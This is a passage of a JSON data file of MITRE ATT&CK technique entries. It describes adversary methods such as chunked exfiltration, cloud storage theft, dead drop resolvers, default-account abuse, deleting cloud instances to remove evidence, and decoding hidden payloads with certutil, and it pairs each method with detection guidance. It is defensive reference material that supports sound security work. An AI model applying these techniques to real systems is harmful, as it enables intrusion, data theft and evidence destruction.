    "{\"created\":\"2017-05-31T21:30:34.523Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.\",\"external_references\":[{\"external_id\":\"T1030\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1030\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"exfiltration\"}],\"modified\":\"2019-06-24T12:03:02.387Z\",\"name\":\"Data Transfer Size Limits\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Netflow/Enclave netflow\",\"Process use of network\",\"Process monitoring\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-08-30T18:07:27.741Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may access data objects from improperly secured cloud storage.\\n\\nMany cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider\'s APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019)\\n\\nMisconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.\",\"external_references\":[{\"external_id\":\"T1530\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1530\"},{\"description\":\"Amazon. (2019, May 17). How can I secure the files in my Amazon S3 bucket?. Retrieved October 4, 2019.\",\"source_name\":\"Amazon S3 Security, 2019\",\"url\":\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\"},{\"description\":\"Amlekar, M., Brooks, C., Claman, L., et. al.. (2019, March 20). Azure Storage security guide. Retrieved October 4, 2019.\",\"source_name\":\"Microsoft Azure Storage Security, 2019\",\"url\":\"https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide\"},{\"description\":\"Google. (2019, September 16). Best practices for Cloud Storage. Retrieved October 4, 2019.\",\"source_name\":\"Google Cloud Storage Best Practices, 2019\",\"url\":\"https://cloud.google.com/storage/docs/best-practices\"},{\"description\":\"Trend Micro. (2017, November 6). A Misconfigured Amazon S3 Exposed Almost 50 Thousand PII in Australia. Retrieved October 4, 2019.\",\"source_name\":\"Trend Micro S3 Exposed PII, 2017\",\"url\":\"https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia\"},{\"description\":\"Barrett, B.. (2019, July 11). Hack Brief: A Card-Skimming Hacker Group Hit 17K Domains—and Counting. Retrieved October 4, 2019.\",\"source_name\":\"Wired Magecart S3 Buckets, 2019\",\"url\":\"https://www.wired.com/story/magecart-amazon-cloud-hacks/\"},{\"description\":\"HIPAA Journal. (2017, October 11). 47GB of Medical Records and Test Results Found in Unsecured Amazon S3 Bucket. Retrieved October 4, 2019.\",\"source_name\":\"HIPAA Journal S3 Breach, 2017\",\"url\":\"https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/\"}],\"id\":\"attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2019-10-22T20:02:00.249Z\",\"name\":\"Data from Cloud Storage Object\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Netskope\",\"Praetorian\"],\"x_mitre_data_sources\":[\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Monitor for unusual queries to the cloud provider\'s storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.\",\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\\n\\nAdversaries may also collect information from shared storage repositories hosted on cloud infrastructure or in software-as-a-service (SaaS) applications, as storage is one of the more fundamental requirements for cloud services and systems.\\n\\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\\n\\n* Policies, procedures, and standards\\n* Physical / logical network diagrams\\n* System architecture diagrams\\n* Technical system documentation\\n* Testing / development credentials\\n* Work / project schedules\\n* Source code snippets\\n* Links to network shares and other internal resources\\n\\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include [Sharepoint](https://attack.mitre.org/techniques/T1213/002), [Confluence](https://attack.mitre.org/techniques/T1213/001), and enterprise databases such as SQL Server.\",\"external_references\":[{\"external_id\":\"T1213\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1213\"},{\"description\":\"Microsoft. (2017, July 19). Configure audit settings for a site collection. Retrieved April 4, 2018.\",\"source_name\":\"Microsoft SharePoint Logging\",\"url\":\"https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2\"},{\"description\":\"Atlassian. (2018, January 9). How to Enable User Access Logging. Retrieved April 4, 2018.\",\"source_name\":\"Atlassian Confluence Logging\",\"url\":\"https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html\"}],\"id\":\"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-06-30T22:50:06.087Z\",\"name\":\"Data from Information Repositories\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\",\"Milos Stojadinovic\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"AWS CloudTrail logs\",\"Stackdriver logs\",\"OAuth audit logs\",\"Application logs\",\"Authentication logs\",\"Data loss prevention\",\"Third-party application logs\"],\"x_mitre_detection\":\"As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\\n\\nThe user access logging within Microsoft\'s SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user access logging within Atlassian\'s Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\",\"SaaS\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:30:20.537Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\\n\\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\\n\",\"external_references\":[{\"external_id\":\"T1005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1005\"}],\"id\":\"attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-05-26T19:21:25.974Z\",\"name\":\"Data from Local System\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Privileges to access certain files and directories\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2017-05-31T21:30:41.022Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.\",\"external_references\":[{\"external_id\":\"T1039\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1039\"},{\"external_id\":\"CAPEC-639\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/639.html\"}],\"id\":\"attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T15:42:44.026Z\",\"name\":\"Data from Network Shared Drive\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Privileges to access network shared drive\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2017-05-31T21:30:31.584Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \\n\\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.\",\"external_references\":[{\"external_id\":\"T1025\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1025\"}],\"id\":\"attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T15:44:46.584Z\",\"name\":\"Data from Removable Media\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for actions that could be taken to collect files from a system\'s connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Privileges to access removable media drive and files\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-03-14T22:24:21.841Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\\n\\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\\n\\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\",\"external_references\":[{\"external_id\":\"T1102.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1102/001\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T23:12:30.499Z\",\"name\":\"Dead Drop Resolver\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Host network interface\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Packet capture\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-08T17:51:41.390Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \\n\",\"external_references\":[{\"external_id\":\"T1491\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1491\"}],\"id\":\"attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-04-22T15:19:31.682Z\",\"name\":\"Defacement\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Web application firewall logs\",\"Web logs\",\"Packet capture\"],\"x_mitre_detection\":\"Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\\n\\n\",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-03-13T20:15:31.974Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)\\n\\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)\",\"external_references\":[{\"external_id\":\"T1078.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1078/001\"},{\"description\":\"Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.\",\"source_name\":\"Microsoft Local Accounts Feb 2019\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts\"},{\"description\":\"undefined. (n.d.). Retrieved April 12, 2019.\",\"source_name\":\"Metasploit SSH Module\",\"url\":\"https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh\"}],\"id\":\"attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-23T21:37:34.567Z\",\"name\":\"Default Accounts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"AWS CloudTrail logs\",\"Stackdriver logs\",\"Authentication logs\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-16T17:23:06.508Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\\n\\nAn adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)\",\"external_references\":[{\"external_id\":\"T1578.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1578/003\"},{\"description\":\"FireEye / Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.\",\"source_name\":\"Mandiant M-Trends 2020\",\"url\":\"https://content.fireeye.com/m-trends/rpt-m-trends-2020\"},{\"description\":\"Amazon. (n.d.). Search CloudTrail logs for API calls to EC2 Instances. Retrieved June 17, 2020.\",\"source_name\":\"AWS CloudTrail Search\",\"url\":\"https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-search-api-calls/\"},{\"description\":\"Microsoft. (n.d.). View Azure activity logs. Retrieved June 17, 2020.\",\"source_name\":\"Azure Activity Logs\",\"url\":\"https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs\"},{\"description\":\"Google. (n.d.). Audit Logs. Retrieved June 1, 2020.\",\"source_name\":\"Cloud Audit Logs\",\"url\":\"https://cloud.google.com/logging/docs/audit#admin-activity\"}],\"id\":\"attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-17T19:53:14.784Z\",\"name\":\"Delete Cloud Instance\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"GCP audit logs\",\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.\\n\\nIn AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances</code> event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google\'s Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete</code> to delete a VM.(Citation: Cloud Audit Logs)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\\n\\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\\n\\nSometimes a user\'s action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)\",\"external_references\":[{\"external_id\":\"T1140\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1140\"},{\"description\":\"Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.\",\"source_name\":\"Malwarebytes Targeted Attack against Saudi Arabia\",\"url\":\"https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/\"},{\"description\":\"Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.\",\"source_name\":\"Carbon Black Obfuscation Sept 2016\",\"url\":\"https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/\"},{\"description\":\"Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.\",\"source_name\":\"Volexity PowerDuke November 2016\",\"url\":\"https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/\"}],\"id\":\"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:07:11.799Z\",\"name\":\"Deobfuscate/Decode Files or Information\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matthew Demaske, Adaptforward\",\"Red Canary\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host intrusion prevention systems\",\"Signature-based detection\",\"Network intrusion detection system\"],\"x_mitre_detection\":\"Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\\n\\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-03-02T20:07:18.651Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001) are when one or more systems are used to send a high-volume of network packets towards the targeted service\'s network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\\n\\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\",\"external_references\":[{\"external_id\":\"T1498.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1498/001\"},{\"description\":\"Preet Bharara, US Attorney. (2016, March 24). Retrieved April 23, 2019.\",\"source_name\":\"USNYAG IranianBotnet March 2016\",\"url\":\"https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T01:10:52.360Z\",\"name\":\"Direct Network Flood\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Sensor health and status\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Network intrusion detection system\",\"Network device logs\"],\"x_mitre_detection\":\"Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the 